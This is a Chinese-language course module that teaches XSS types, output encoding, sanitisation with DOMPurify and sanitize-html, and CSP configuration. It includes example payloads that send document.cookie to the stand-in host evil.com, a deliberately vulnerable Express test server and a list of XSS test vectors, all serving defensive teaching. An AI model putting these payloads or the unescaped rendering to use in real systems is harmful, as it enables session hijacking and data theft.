# 01-XSS 防御与 CSP 策略

<!-- course-meta:start -->
> **课程元数据**
> - 层级：L5 架构与纵深能力
> - 先修：[04-渲染性能与动画优化](../01-性能工程/04-渲染性能与动画优化.md)
> - 建议用时：180-300 分钟
> - 技术基线：2026-10，详见[技术基线与来源](../../技术基线与来源.md)
> - 一手资料：[OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
> - 完成要求：运行示例、完成至少基础作业、提交验证记录
<!-- course-meta:end -->

## 学习目标

- 深入理解 XSS 三种类型（存储型、反射型、DOM 型）的攻击原理和完整攻击链路
- 掌握 XSS 纵深防御体系：输出编码、输入净化、CSP 三重防线
- 能根据不同场景选择正确的编码方式（HTML 实体、JS 编码、URL 编码）
- 理解 CSP 指令体系，能根据项目需求编写生产级 CSP 策略
- 认清现代框架的自动 XSS 防护边界：什么被保护、什么仍需要你手动处理
- 能独立完成一个应用的安全加固：配置 CSP、测试常见攻击向量、建立安全回归机制

---

## 内容讲解

### 一、XSS 的本质：代码与数据的边界被打破

XSS（Cross-Site Scripting，跨站脚本攻击）不是一个漏洞，而是一类漏洞。它们的共同本质是：**攻击者将恶意代码注入到 Web 页面中，浏览器将其当作合法脚本执行**。

为什么这种注入如此普遍？根本原因在于 Web 的核心机制——HTML、CSS、JavaScript 三种语言混在同一个文档中，解析器的上下文切换极其复杂。一段数据在 HTML 解析器眼中是"文本"，但在 JS 解析器眼中可能就是"待执行的代码"。XSS 发生的时刻，正是这个边界被打破的时刻。

```
服务端/浏览器认为这是数据
           ↓
    "Hello, <script>alert(1)</script>"
           ↓
浏览器解析后变成了可执行代码 ← XSS 发生
```

---

### 二、三种 XSS 类型：原理、攻击链路、真实案例

#### 2.1 存储型 XSS（Stored XSS）

**原理**：恶意脚本被永久存储在目标服务器上（数据库、文件系统、消息队列等），当用户访问包含该数据的页面时，脚本从服务器取出并在受害者浏览器中执行。

**攻击链路**：

```
攻击者 → 提交恶意内容到服务器（留言、评论、用户资料等）
                 ↓
        服务器存储到数据库（未做任何处理）
                 ↓
        正常用户访问该页面，服务器返回包含恶意脚本的 HTML
                 ↓
        恶意脚本在正常用户的浏览器中执行 → 窃取 Cookie、劫持会话、篡改页面
```

**真实案例**：2005 年 MySpace 的 Samy 蠕虫。Samy Kamkar 在他的 MySpace 个人资料中嵌入了一段 JS，任何访问他主页的用户都会自动将 Samy 添加为好友，并在自己的资料页也植入同样的代码。24 小时内，超过 100 万用户被感染。MySpace 的过滤机制只做了黑名单（禁止 `javascript:`），但 Samy 用 CSS 的 `expression()` 和字符串拼接绕过了所有过滤。

**简化演示（仅用于教育目的）**：

```javascript
// 攻击者提交的评论内容（仅用于教育目的）
const maliciousComment = `<div>很棒的博客！
  <script>
    // 窃取用户的 Cookie 并发送到攻击者服务器
    fetch('https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie));
  </script>
</div>`;

// 如果后端直接拼接进 HTML 模板（不做任何编码）：
app.get('/blog/:id', async (req, res) => {
  const { title, comments } = await getBlogPost(req.params.id);
  // ❌ 致命错误：直接将评论内容嵌入 HTML，没有任何转义
  const html = `
    <h1>${title}</h1>
    <div class="comments">
      ${comments.map(c => `<p>${c.content}</p>`).join('')}
    </div>
  `;
  res.send(html);
});
// 每个阅读这篇博客的用户，其 Cookie 都会被发送到 evil.com
```

#### 2.2 反射型 XSS（Reflected XSS）

**原理**：恶意脚本通过 URL 参数、表单提交等途径"反射"回页面，在受害者点击构造好的链接后立即执行。不会持久化到服务器。

**攻击链路**：

```
攻击者构造恶意 URL → 通过邮件/IM/短信发给受害者
                 ↓
        受害者点击链接 → 请求到达服务器
                 ↓
        服务器将 URL 参数直接拼入响应 HTML（搜索词、错误信息等）
                 ↓
        恶意脚本在受害者浏览器中执行
```

**简化演示（仅用于教育目的）**：

```html
<!-- 攻击者构造的链接（仅用于教育目的） -->
<!-- https://victim.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> -->
<!-- 通过短链接服务伪装后发给受害者 -->

<!-- 如果搜索页面这样渲染搜索结果： -->
<h2>搜索结果："<?php echo $_GET['q']; ?>"</h2>
<!-- 浏览器解析后，script 标签被当作 HTML 执行，不是文本显示 -->

<!-- ✅ 你应该这样做：对输出做 HTML 实体编码 -->
<h2>搜索结果："&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;"</h2>
```

#### 2.3 DOM 型 XSS（DOM-based XSS）

**原理**：攻击发生在客户端，恶意数据通过 JavaScript 操作 DOM 时被写入页面。服务器完全不知情——恶意代码从未到达服务器。

**攻击链路**：

```
攻击者构造恶意 URL（带 #fragment 或 query 参数）
                 ↓
        页面 JS 读取 URL 参数（如 location.hash、document.referrer）
                 ↓
        JS 将参数值直接写入 innerHTML / document.write / eval
                 ↓
        恶意脚本在浏览器中执行 ← 服务器全程无感知
```

**最常见的 DOM XSS 入口点（sources）**：

> `location.hash`、`location.search`、`document.referrer`、`window.name`、`postMessage` 接收的数据、`localStorage` 中被污染的值。

**最常见的危险写入点（sinks）**：

> `innerHTML`、`outerHTML`、`document.write()`、`eval()`、`setTimeout(字符串参数)`、`setInterval(字符串参数)`、`new Function()`、`href` 的 `javascript:` 协议。

**简化演示（仅用于教育目的）**：

```javascript
// 页面 URL: https://victim.com/page#<img src=x onerror=alert(1)>

// ❌ 危险的 DOM 操作
const userInput = location.hash.slice(1);        // 读取 # 后的内容
document.getElementById('content').innerHTML = userInput; // 直接写入 HTML

// innerHTML 会解析 <img> 标签 → onerror 触发 → 攻击代码执行
```

**为什么 DOM XSS 更隐蔽？** 它不经过服务器，所以 WAF（Web 应用防火墙）和日志系统完全看不到。前端开发者需要自己负责这一层的安全。

---

### 三、XSS 纵深防御：三道防线

安全领域有一条铁律：**永远不要依赖单一防线**。XSS 的防御应该是纵深防御——每一层都能独立阻止攻击，任何一层失效都有下一层接管。

```
第 1 道防线：输出编码 → "即使恶意数据进来了，浏览器也不会把它当成代码"
      ↓（如果被绕过）
第 2 道防线：输入净化 → "在数据进入系统前，剥离掉恶意内容"
      ↓（如果被绕过）  
第 3 道防线：CSP        → "即使恶意脚本被注入了，浏览器也拒绝执行它"
```

---

### 四、输出编码：正确选择编码上下文

输出编码的核心原则是：**你输出到哪个上下文，就用哪种编码方式**。把数据当 HTML 输出时需要 HTML 编码，把数据放入 JS 变量时需要 JS 编码——用错编码等于没编码。

#### 4.1 HTML 实体编码

用于：将不可信数据插入 HTML 文本内容或属性值时。

| 字符 | HTML 实体 |
|------|----------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

```javascript
/**
 * HTML 实体编码函数——将特殊字符转义为 HTML 实体
 * 用途：将不可信数据插入 HTML 文本内容或属性值时调用
 */
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 使用示例 —— 永远是"先编码，再拼接"
const userComment = '<script>alert("xss")</script>';
const safe = `<p>${escapeHtml(userComment)}</p>`;
// 结果：<p>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</p>
// 浏览器会显示文本，而不是执行脚本
```

但注意一个常见错误：**把 HTML 编码后的数据放入 `<script>` 标签内的 JS 变量中，HTML 实体编码不保护 JS 上下文**：

```javascript
// ❌ 错误：HTML 实体编码在 JS 字符串上下文中不生效
// <script>const name = "&lt;script&gt;alert('xss')&lt;/script&gt;";</script>
// 浏览器解析 <script> 标签时，先做 HTML 解析得到 JS 字符串，
// &lt; 在 JS 字符串中会被还原为 < —— 这本身不会执行，但如果配合
// 其他漏洞（如模板字符串注入）就可能出问题。

// ✅ 正确：在 JS 上下文中使用 JS 编码，而非 HTML 编码
```

#### 4.2 JavaScript 编码

用于：将不可信数据插入 JavaScript 字符串字面量中。

```javascript
/**
 * JavaScript 字符串编码——对 JS 字符串中的特殊字符进行转义
 * 用于将不可信数据嵌入 <script> 标签或内联事件处理器中
 * 
 * 注意：尽可能避免将不可信数据放入 JS 上下文。
 * 如果必须这样做，请使用此函数。
 */
function escapeJavaScript(unsafe) {
  return unsafe
    .replace(/\\/g, '\\\\')   // 反斜杠
    .replace(/'/g, "\\'")     // 单引号
    .replace(/"/g, '\\"')     // 双引号
    .replace(/\//g, '\\/')    // 斜杠（防止 </script> 注入）
    .replace(/\n/g, '\\n')    // 换行
    .replace(/\r/g, '\\r');   // 回车
}

// 如果你的数据无论如何都要放进 <script> 内：
const userName = '</script><script>alert(1)</script>';
// ✅ 先 JS 编码
const safeJs = escapeJavaScript(userName);
// 再 JSON.stringify 包一层（额外保护）
const code = `<script>const userName = ${JSON.stringify(userName)};</script>`;
// JSON.stringify 会自动转义引号和特殊字符，是最安全的内置方案
```

#### 4.3 URL 编码

用于：将不可信数据放入 URL 参数或路径中。

```javascript
// ❌ 危险：直接拼接用户输入到 URL 中
const redirectTo = new URLSearchParams(location.search).get('redirect');
location.href = redirectTo; // 攻击者可以传入 javascript:alert(1)

// ✅ 方案一：白名单验证——只允许合法的目标路径
const ALLOWED_REDIRECTS = ['/dashboard', '/profile', '/settings'];
if (ALLOWED_REDIRECTS.includes(redirectTo)) {
  location.href = redirectTo;
} else {
  location.href = '/'; // 默认回退到首页
}

// ✅ 方案二：使用 URL 编码处理参数值
const searchQuery = '<script>alert(1)</script>';
// encodeURIComponent 将特殊字符转为 %XX 形式
const safeUrl = `/search?q=${encodeURIComponent(searchQuery)}`;
// 结果：/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
// 浏览器不会将其中的 < > 解析为 HTML 标签

// ❌ 常见错误：用 encodeURI 而不是 encodeURIComponent
// encodeURI 不会编码 ? & = / 等 URL 保留字符
// 始终用 encodeURIComponent 编码参数值
```

#### 4.4 上下文感知的编码策略总结

| 数据插入位置 | 编码方式 | 工具/方法 |
|-------------|---------|----------|
| HTML 文本内容 | HTML 实体编码 | `escapeHtml()` |
| HTML 属性值（用引号包裹） | HTML 实体编码 | `escapeHtml()` + 始终用引号包裹 |
| JavaScript 字符串 | JS 编码 + JSON.stringify | `JSON.stringify()` 最安全 |
| URL 参数值 | URL 编码 | `encodeURIComponent()` |
| CSS 中的值 | CSS 编码 | 避免将数据放入 CSS |
| HTML 属性中的 URL (href/src) | URL 编码 + 协议白名单 | 先验证协议，再编码 |

---

### 五、输入验证和净化：DOMPurify / sanitize-html

输出编码处理的是"输出时转义"，但有时你的业务确实需要支持用户输入富文本（评论可以加粗、帖子可以带链接等）。此时需要**净化（sanitize）**：保留安全的 HTML 标签和属性，剥离掉危险的部分。

#### 5.1 前端净化：DOMPurify

[DOMPurify](https://github.com/cure53/DOMPurify) 是目前最可靠的前端 HTML 净化库，它使用浏览器原生的 DOM 解析能力（而非正则），几乎不可能被绕过。

```javascript
import DOMPurify from 'dompurify';

/**
 * 安全地渲染用户提交的富文本内容
 * 只允许安全的标签和属性，会剥离 <script>、onerror 等危险内容
 */

// 用户提交的富文本（可能包含恶意代码）
const userContent = `
  <p>这是一段<b>加粗</b>的正常文本</p>
  <script>alert('xss')</script>
  <img src="x" onerror="alert('xss')" />
  <a href="javascript:alert('xss')">点击我</a>
`;

// ✅ DOMPurify 净化后：只保留安全的标签和属性
const clean = DOMPurify.sanitize(userContent);
// 结果：
// <p>这是一段<b>加粗</b>的正常文本</p>
// <img src="x">
// <a>点击我</a>
// — script 标签被移除，onerror 属性被移除，javascript: 协议被移除

// 在实际 React 组件中使用：
function Comment({ content }) {
  return (
    <div
      // ✅ 即使有了 DOMPurify，仍然用 dangerouslySetInnerHTML 这个显式名称
      // 提醒每个读代码的人：这里绕过了 React 的安全机制，需要小心
      dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }}
    />
  );
}
```

**DOMPurify 的进阶配置**：

```javascript
// 针对具体业务场景的精细配置
const sanitizeComment = (dirty) => DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'target'],
  ALLOWED_URI_REGEXP: /^https?:\/\//, // 只允许 http/https 协议
  // 禁止所有 SVG 和 MathML（它们是 XSS 的重灾区）
  FORBID_TAGS: ['style', 'script', 'svg', 'math'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick'],
});

// 返回净化后的文本内容（也可以用于纯文本提取）
const plainText = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: [],       // 不允许任何标签
  ALLOWED_ATTR: [],       // 不允许任何属性
  RETURN_TRUSTED_TYPE: true, // 返回 TrustedHTML 类型，配合 CSP
});
```

#### 5.2 后端净化：sanitize-html（Node.js）

```javascript
// npm install sanitize-html
const sanitizeHtml = require('sanitize-html');

/**
 * 后端 API 在存储用户内容之前进行净化
 * 防御思路：在数据入库前做一次净化 + 输出时再做编码
 * 两层防护，任何一层失效都不至于产生漏洞
 */
function sanitizeUserContent(dirty) {
  return sanitizeHtml(dirty, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat([
      'img', 'h1', 'h2', 'span'
    ]),
    allowedAttributes: {
      'a': ['href', 'title', 'target'],
      'img': ['src', 'alt', 'width', 'height'],
    },
    // 将相对链接转为绝对链接，防止利用相对路径绕过检查
    transformTags: {
      'a': sanitizeHtml.simpleTransform('a', { rel: 'noopener noreferrer' }),
    },
  });
}

// 在 API 路由中使用
app.post('/api/comments', async (req, res) => {
  const cleanContent = sanitizeUserContent(req.body.content);
  await db.comments.create({ content: cleanContent, userId: req.user.id });
  res.json({ success: true });
});
```

---

### 六、Content Security Policy（CSP）：最后的防线

CSP 是通过 HTTP 响应头告诉浏览器："这个页面只允许加载来自这些来源的资源，只允许执行来自这些来源的脚本"。即使攻击者成功注入了 `<script>` 标签，浏览器也不会执行它——除非注入的脚本恰好来自白名单中的来源。

#### 6.1 CSP 核心指令详解

```
指令格式：Content-Security-Policy: <directive> <source1> <source2>; <directive> ...
```

| 指令 | 控制范围 | 说明 |
|------|---------|------|
| `default-src` | 所有资源类型的默认策略 | 没有单独指定策略时回退到此值 |
| `script-src` | JavaScript 的来源 | CSP 的核心：控制哪些脚本能执行 |
| `style-src` | CSS 的来源 | 防止 CSS 注入攻击 |
| `img-src` | 图片的来源 | 限制图片加载来源 |
| `connect-src` | fetch/XHR/WebSocket 的来源 | 限制 JS 发起的网络请求 |
| `font-src` | 字体的来源 | 与 `@font-face` 配合 |
| `frame-src` | iframe 的来源 | 防止点击劫持 |
| `form-action` | 表单提交的目标 | 限制 form 能提交到的 URL |
| `base-uri` | `<base>` 标签的值 | 防止攻击者篡改相对路径基准 |
| `object-src` | `<object>/<embed>/<applet>` 来源 | 几乎总是设为 'none' |

**source 值的含义**：

| source 值 | 含义 |
|----------|------|
| `'self'` | 同源（协议 + 域名 + 端口都相同） |
| `'none'` | 不匹配任何来源 |
| `'unsafe-inline'` | 允许内联脚本/样式（**你几乎永远不应该在 script-src 中用它**） |
| `'unsafe-eval'` | 允许 `eval()` / `new Function()`（**同样极其危险**） |
| `'strict-dynamic'` | 如果脚本通过 nonce/hash 加载，则它动态创建的脚本也获得信任 |
| `https:` | 只允许 HTTPS 协议加载 |
| `https://cdn.example.com` | 只允许该具体来源 |
| `'nonce-{随机值}'` | 只允许带有匹配 nonce 属性的 `<script>` 标签执行 |
| `'sha256-{hash}'` | 只允许内容哈希匹配的内联脚本执行 |

#### 6.2 CSP 配置策略

**策略一：严格 CSP（推荐）——基于 nonce 或 hash**

```javascript
// 在 Node.js 服务端中间件中生成 nonce CSP
const crypto = require('crypto');

app.use((req, res, next) => {
  // 每次请求生成一个不可预测的随机 nonce
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce; // 传递给模板引擎

  res.setHeader(
    'Content-Security-Policy',
    [
      `default-src 'self'`,
      `script-src 'self' 'nonce-${nonce}' 'strict-dynamic' https:`,
      `style-src 'self' 'unsafe-inline'`,  // CSS 内联通常是安全的（没有 JS 执行能力）
      `img-src 'self' https: data:`,
      `font-src 'self' https://fonts.gstatic.com`,
      `connect-src 'self' https://api.example.com`,
      `frame-ancestors 'none'`,            // 禁止被 iframe 嵌套（防点击劫持）
      `base-uri 'self'`,
      `form-action 'self'`,
      `object-src 'none'`,                 // 禁止 Flash / Java 等插件
      `upgrade-insecure-requests`,         // 自动将 HTTP 升级为 HTTPS
    ].join('; ')
  );

  next();
});
```

在 HTML 中配合 nonce：

```html
<!-- ✅ nonce 匹配的脚本才能执行 -->
<script nonce="rAnDoM1234567890Base64==">
  console.log('这个脚本可以执行，因为 nonce 匹配');
</script>

<!-- ❌ 攻击者注入的脚本没有 nonce，浏览器拒绝执行 -->
<script>alert('这个脚本不会被执行')</script>
```

**策略二：基于 hash 的严格 CSP（适用于静态站点）**

```html
<!-- 在 HTTP 响应头中声明脚本的 SHA-256 哈希 -->
<!-- Content-Security-Policy: script-src 'sha256-abc123...'; -->
<!-- 只有哈希完全匹配的内联脚本才能执行 -->

<script>console.log('hello');</script>
<!-- 这个脚本的内容哈希 = sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc= -->
<!-- 必须在 CSP 头中声明这个哈希值，脚本才能执行 -->
```

**策略三：报告模式（在部署严格策略之前收集数据）**

```javascript
// 先用 Report-Only 模式观察，不影响现有功能
res.setHeader(
  'Content-Security-Policy-Report-Only',
  [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `report-uri /csp-violation-report`,   // 或使用 report-to
  ].join('; ')
);
```

接收到 CSP 违规报告的后端端点：

```javascript
// 接收 CSP 违规报告，用于监控和调试
app.post('/csp-violation-report', express.json(), (req, res) => {
  const violation = req.body['csp-report'];
  console.warn('[CSP 违规]', {
    blockedUri: violation['blocked-uri'],
    violatedDirective: violation['violated-directive'],
    documentUri: violation['document-uri'],
    scriptSample: violation['script-sample']?.substring(0, 40),
  });
  // 实际项目中应上报到监控系统（Sentry / 自建日志平台）
  res.status(204).end();
});
```

#### 6.3 CSP 常见配置模板

**开发环境（宽松，方便调试）**：

```
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src * data:; connect-src * ws:;
```

**严格生产环境（推荐）**：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{随机}' 'strict-dynamic' https:;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests;
```

**第三方脚本较多的站点（妥协方案）**：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com https://www.googletagmanager.com https://js.stripe.com;
  style-src 'self' 'unsafe-inline' https://cdn.example.com;
  frame-src https://js.stripe.com https://www.youtube.com;
  connect-src 'self' https://api.example.com https://sentry.io;
  report-uri https://example.com/csp-report;
```

> **重要提醒**：如果 script-src 中包含了 `'unsafe-inline'` 或允许了用户可控的 CDN，那么 CSP 的脚本防护几乎形同虚设。只有在万不得已（且你清楚风险）时才用妥协模板，并尽快向严格 CSP 迁移。

---

### 七、现代框架的内置 XSS 防护：保护了什么、没保护什么

#### 7.1 React 的 JSX 自动转义

React 的 JSX 在编译时将所有 `{}` 中的表达式值进行转义，字符串中的 HTML 标签被渲染为文本而非 DOM 节点：

```jsx
// React 自动保护：userInput 中的 HTML 标签会被当作文本显示
function Comment({ userInput }) {
  // 假设 userInput = '<img src=x onerror=alert(1)>'
  return <p>{userInput}</p>; // ✅ 安全：渲染为文本，不会执行
}

// ❌ 绕过保护：dangerouslySetInnerHTML —— 名字本身就是在警告你
function UnsafeComment({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // ⚠️ 直接注入原始 HTML，如果 userInput 包含恶意代码就会执行
}

// ✅ 如果你必须渲染富文本：先用 DOMPurify 净化
function SafeRichContent({ htmlContent }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(htmlContent) }} />;
}

// ❌ 另一个绕过点：a 标签的 href 如果来自用户输入
function UserLink({ url }) {
  // 假设 url = 'javascript:alert(1)'
  return <a href={url}>点击</a>; // ⚠️ React 不会对 href 协议做校验
}

// ✅ 正确做法：验证 URL 协议
function SafeUserLink({ url }) {
  const safe = /^(https?:|\/|#)/.test(url) ? url : '#';
  return <a href={safe} rel="noopener noreferrer">点击</a>;
}
```

**React 保护的**：JSX 中的文本内容（`{variable}`）和大部分属性值。

**React 不保护的**：`dangerouslySetInnerHTML`、`href` 协议、`src` 协议、通过 `ref` 直接操作 DOM、`createPortal` 的内容。

#### 7.2 Vue 的模板转义

```html
<!-- Vue 模板自动转义：userInput 中的 HTML 会被当作文本显示 -->
<template>
  <p>{{ userInput }}</p>  <!-- ✅ 安全：自动 HTML 编码 -->
</template>

<!-- ❌ 绕过保护：v-html —— 和 React 的 dangerouslySetInnerHTML 一样危险 -->
<template>
  <div v-html="userInput"></div> <!-- ⚠️ 直接注入原始 HTML -->
</template>

<!-- ✅ 如果必须渲染富文本，先用 DOMPurify 净化 -->
<template>
  <div v-html="sanitizedContent"></div>
</template>
<script setup>
import DOMPurify from 'dompurify';
import { computed } from 'vue';

const props = defineProps({ content: String });
const sanitizedContent = computed(() => DOMPurify.sanitize(props.content));
</script>

<!-- ❌ Vue 也不保护动态属性绑定中的 URL -->
<a :href="userProvidedUrl"> <!-- ⚠️ 可能注入 javascript: 协议 -->
```

#### 7.3 框架安全边界表

| 场景 | React | Vue | 需要手动防护 |
|------|-------|-----|-------------|
| JSX/模板中的文本 `{data}` / `{{ data }}` | ✅ 自动 | ✅ 自动 | 否 |
| `dangerouslySetInnerHTML` / `v-html` | ❌ 绕过 | ❌ 绕过 | 是（DOMPurify） |
| `href` / `src` 等 URL 属性 | ❌ 不校验 | ❌ 不校验 | 是（协议白名单） |
| 通过 ref 直接操作 DOM | ❌ 不保护 | ❌ 不保护 | 是 |
| `eval()` / `new Function()` | ❌ 不保护 | ❌ 不保护 | 是（永远不要用） |
| `document.write()` | ❌ 不保护 | ❌ 不保护 | 是（永远不要用） |

---

### 八、实战：为应用配置 CSP 并测试 XSS 攻击向量

#### 8.1 搭建测试环境

```javascript
// server.js —— 一个故意留了 XSS 漏洞的 Express 应用
const express = require('express');
const crypto = require('crypto');

const app = express();

// 假设这是一个"留言板"应用，存储型 XSS 的典型场景
const comments = [
  { user: '小明', content: '很好的教程！' },
  {
    user: '攻击者',
    // 模拟攻击者提交了恶意内容（仅用于教育目的）
    content: '<img src=x onerror="alert(\'XSS攻击成功！你的Cookie: \'+document.cookie)">',
  },
];

app.get('/', (req, res) => {
  // ❌ 第一个漏洞：直接拼接数据到 HTML，没有转义
  // ✅ 修复：对 comment.content 做 HTML 实体编码
  const html = `
<!DOCTYPE html>
<html>
<head><title>留言板 (XSS 测试)</title></head>
<body>
  <h1>留言板</h1>
  ${comments.map((c, i) => `
    <div class="comment">
      <strong>${escapeHtml(c.user)}:</strong>
      <p>${escapeHtml(c.content)}</p>
    </div>
  `).join('')}

  <!-- ❌ 第二个漏洞：搜索词反射到页面 -->
  <form action="/search"><input name="q" /><button>搜索</button></form>
</body>
</html>`;
  res.send(html);
});

// ❌ 反射型 XSS：搜索词直接回显
app.get('/search', (req, res) => {
  const q = req.query.q || '';
  // ❌ 没有转义
  // ✅ 修复：res.send(`<p>搜索结果："${escapeHtml(q)}"</p>`);
  res.send(`<p>你搜索了："${q}"</p>`);
});

// 安全的 HTML 实体编码函数
function escapeHtml(unsafe) {
  return String(unsafe)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

app.listen(3000, () => console.log('测试服务器运行在 http://localhost:3000'));
```

#### 8.2 添加 CSP 中间件

```javascript
// csp-middleware.js —— 生产可用的 CSP 中间件
const crypto = require('crypto');

function cspMiddleware(req, res, next) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self' 'nonce-" + nonce + "' 'strict-dynamic' https:",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' https: data:",
      "font-src 'self' https://fonts.gstatic.com",
      "connect-src 'self' https://api.example.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "object-src 'none'",
      // 先使用 Report-Only，观察一段时间后再切换为强制的 Content-Security-Policy
    ].join('; ')
  );

  next();
}

module.exports = cspMiddleware;
```

#### 8.3 手动测试 XSS 攻击向量（安全测试 Checklist）

在浏览器的地址栏或表单输入中依次测试以下向量（在本地测试环境中）：

| # | 测试向量 | 测试类型 | 预期防御 |
|---|---------|---------|---------|
| 1 | `<script>alert(1)</script>` | 存储型/反射型 | HTML 编码后显示为文本 |
| 2 | `<img src=x onerror=alert(1)>` | 存储型/反射型 | HTML 编码或标签被净化 |
| 3 | `javascript:alert(1)` | href 注入 | 协议白名单过滤 |
| 4 | `"-alert(1)-"` | 属性逃逸 | 始终用引号包裹属性值 + HTML 编码 |
| 5 | `<svg/onload=alert(1)>` | SVG 注入 | 净化或 CSP 禁止内联脚本 |
| 6 | `eval(location.hash.slice(1))` → URL 加 `#alert(1)` | DOM 型 | 禁止使用 eval + CSP 禁止 'unsafe-eval' |
| 7 | 在 Console 中手动 `document.body.innerHTML = '<img src=x onerror=alert(1)>'` | CSP 验证 | 即使手动注入，CSP 也拒绝执行内联脚本 |

---

## 常见问题

**Q1：React 的 JSX 真的完全防止 XSS 吗？**

A：JSX 的 `{}` 表达式会自动对字符串做 HTML 编码，这保护了绝大多数的文本渲染场景。但以下场景需要你自己负责：`dangerouslySetInnerHTML`、`href`/`src` 中的 `javascript:` 协议、`a` 标签的 `href` 接收用户输入、通过 `createPortal` 渲染到外部 DOM 节点、通过 ref 直接操作 `innerHTML`。React 的保护不是全能的，它是一个安全的默认行为，但提供了明确的"逃生舱"——`dangerouslySetInnerHTML` 这个命名本身就是在告诉你："你在做危险的事，请自己确保安全"。

**Q2：DOMPurify 和 sanitize-html 哪个更强？**

A：DOMPurify 使用浏览器原生 DOM 解析器（`DOMParser`），这使它极难被绕过——它依赖的不是正则表达式，而是浏览器的 HTML 解析规则本身。sanitize-html 是在 Node.js 端运行的，使用的是 htmlparser2 这个第三方解析器。结论：前端净化用 DOMPurify，后端净化用 sanitize-html，最安全的是两端都做。

**Q3：CSP 的 `'unsafe-inline'` 在 script-src 中多危险？**

A：如果 script-src 包含 `'unsafe-inline'`，那么内联 `<script>` 标签、`onerror` 等事件处理器属性、`javascript:` URL 都可以执行。这意味着你的 CSP 对 XSS 几乎没有防护作用——攻击者注入的任何内联脚本都能运行。`'unsafe-inline'` 之所以存在，是历史遗留原因（老项目升级 CSP 的过渡方案），新项目永远不应该在 script-src 中使用它。如果确实需要内联脚本，使用 nonce 或 hash 替代。

**Q4：nonce 和 hash 方式哪个更适合生产环境？**

A：nonce 适合服务端渲染（SSR）场景——每次请求生成新的 nonce，攻击者无法预测。hash 适合纯静态站点——内容哈希是固定的，不需要服务端参与。但注意：strict-dynamic 和 nonce 配合使用时，nonce 可信脚本动态创建的脚本也会获得信任，这可能导致"信任传播"问题，需要确保所有被 nonce 授权的脚本本身也是安全的。

**Q5：为什么 CSP 配置后页面功能异常了？**

A：最常见的原因：你的前端代码中有内联事件处理器（如 `onclick="..."`）或内联 `<script>` 标签。严格 CSP 禁止这些。解决方案：(1) 将所有事件处理改为 `addEventListener`；(2) 给必要的内联脚本加 nonce；(3) 先用 Report-Only 模式运行几天，通过违规报告收集所有需要白名单的来源，确认无误后再切换到强制模式。

**Q6：XSS 防御和 CSRF 防御有什么关系？**

A：它们是互补的。XSS 防御防止攻击者在你的页面上执行脚本，CSRF 防御防止攻击者利用用户的身份发起恶意请求。如果 XSS 防御失败，攻击者可以在你的页面上执行任意脚本，那么 CSRF Token、SameSite Cookie 等都可能被绕过（XSS 可以读取页面上的 CSRF Token 并发起同源请求）。因此 XSS 防御是整个 Web 安全的基石。

**Q7：innerHTML 有没有安全的替代方案？**

A：有。如果你只需要插入文本内容，使用 `textContent`（不解析 HTML，XSS 免疫）。如果你需要插入一小段安全的 HTML 但不想用 innerHTML，使用 `insertAdjacentHTML`（行为和 innerHTML 一样，不更安全）或更现代的方案：用 DOMPurify 净化后用 `setHTMLUnsafe`（正在标准化的新 API）。总之，innerHTML 本身不是问题——直接将不可信数据传给 innerHTML 才是问题。

**Q8：暗网/Dark Web 上的 XSS 和普通网站有区别吗？**

A：从技术原理上完全相同——都是代码与数据的边界被打破。但攻击者的动机不同：普通网站的 XSS 通常用于窃取用户数据（Cookie、Token、支付信息）；而高价值目标（银行、加密货币交易所、政府网站）的 XSS 可能连接到更复杂的攻击链条中。

---

## 实操作业

### 基础练习：识别和修复 XSS 漏洞

1. 在本地的留言板应用中（上面的 `server.js`），用浏览器访问并测试至少 5 种不同的 XSS 攻击向量
2. 记录哪些向量成功执行了、哪些被框架或浏览器挡住了
3. 按输出上下文修复：普通文本使用 `textContent` 或 HTML 文本编码，富文本使用净化器，URL 验证协议与来源；避免将不可信数据插入内联 JavaScript/CSS。重新测试同一组向量，记录执行是否被阻止和正常内容是否保留
4. 在 React 中创建一个富文本评论组件，分别演示：有 DOMPurify 净化 和 没有净化 两种情况下的 XSS 结果

### 进阶练习：从零配置生产级 CSP

1. 为一个现有的 React / Vue 项目添加 CSP 策略（先用 Report-Only 模式）
2. 部署后观察 48 小时的 CSP 违规报告，列出所有需要白名单的来源
